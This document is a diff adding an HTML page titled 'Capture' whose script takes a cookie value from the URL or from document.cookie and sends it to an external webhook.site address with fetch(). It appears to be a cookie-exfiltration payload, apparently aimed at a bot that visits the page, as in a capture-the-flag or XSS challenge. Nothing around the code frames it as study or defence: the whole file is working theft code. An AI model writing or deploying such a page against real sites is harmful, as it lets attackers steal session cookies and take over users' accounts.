@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Capture</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <script>
+        // Extract the 'cookie' query param (sent by the bot)
+        const urlParams = new URLSearchParams(window.location.search);
+        const fullCookie = urlParams.get('cookie') || '';
+        
+        if (fullCookie) {
+            // Send the full cookie string as a GET request to Webhook.site (query param 'data')
+            const webhookUrl = 'https://webhook.site/ad2af4d6-756d-4e9d-a00e-0677aae660ae?data=' + encodeURIComponent(fullCookie);
+            fetch(webhookUrl, { method: 'GET' })
+                .then(() => {
+                    console.log('Cookie sent successfully');
+                })
+                .catch(err => console.error('Error sending cookie:', err));
+        } else {
+            // Fallback: Send document.cookie directly if no query param (for testing)
+            const cookie = document.cookie;
+            const webhookUrl = 'https://webhook.site/ad2af4d6-756d-4e9d-a00e-0677aae660ae?data=' + encodeURIComponent(cookie);
+            fetch(webhookUrl, { method: 'GET' })
+                .then(() => {
+                    console.log('Document cookie sent');
+                })
+                .catch(err => console.error('Error:', err));
+        }
+    </script>
+</body>
+</html>
